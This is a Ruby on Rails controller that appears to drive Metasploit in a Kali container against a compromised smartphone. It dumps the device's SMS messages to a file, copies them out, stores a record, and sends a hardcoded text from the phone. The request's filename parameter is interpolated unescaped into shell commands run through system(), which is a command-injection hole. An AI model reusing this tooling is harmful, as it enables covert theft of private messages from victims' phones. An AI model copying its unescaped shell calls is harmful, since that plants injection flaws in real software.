class SmsMessagesController < InheritedResources::Base
  def dump_messages
    begin
      commandTimeout = params[:exec_timeout].to_i
      downloadTimeout = params[:copy_timeout].to_i
      fileName = params[:filename].to_s
      @smartphone = Smartphone.find(params[:smartphone_id])
      currentTime = DateTime.now
      currentTimeFormat = currentTime.strftime("%Y-%m-%d_%H--%M--%S")
      @fileName = fileName.empty? ?
        "sms_messages_dump_" + currentTimeFormat + ".txt" :
        fileName + ".txt"
      processCommand = "dump_sms -o #{@fileName}"
      commandOutput = start_msf_process(processCommand)
      1.upto(commandTimeout) do |n|
        if system("docker exec kali_container sh -c \"ls | grep #{@fileName}\"")
          break
        else
          puts "Waiting ..."
        end
        sleep 1
      end
      copyMessagesCommand = "docker cp kali_container:/#{@fileName} files/dumps/sms_messages_dumps/#{@fileName}"
      system(copyMessagesCommand)
      fullPath = "files/dumps/sms_messages_dumps/" + @fileName
      isOperationSuccessful = false
      1.upto(downloadTimeout) do |n|
        if File.file?(fullPath)
          newMessageDump = SmsMessage.new(:date => currentTimeFormat.gsub("_", " ").gsub("--", ":"),
                                          :filename => @fileName,
                                          :smartphone_id => @smartphone.id)
          newMessageDump.save!
          isOperationSuccessful = true
          break
        else
          puts "Waiting ..."
        end
        sleep 1
      end
      commandOutput = ["Operation Failed"] if not isOperationSuccessful
    rescue
      puts "Error on dump messages"
      commandOutput = ["Operation Failed"]
    end
    respond_to do |format|
      format.js {
        render "dump_messages",
               :locals => { :commandOutput => commandOutput,
                            :fileName => @fileName }
      }
    end
  end

  def send_sms
    processCommand = 'send_sms -d 0729380759 -t "bla bla"'
    commandOutput = start_msf_process(processCommand)
    respond_to do |format|
      format.js {
        render "send_message",
               :locals => { :commandOutput => commandOutput }
      }
    end
  end

  private

  def sms_message_params
    params.require(:sms_message).permit(:date,
                                        :filename,
                                        :smartphone_id)
  end
end
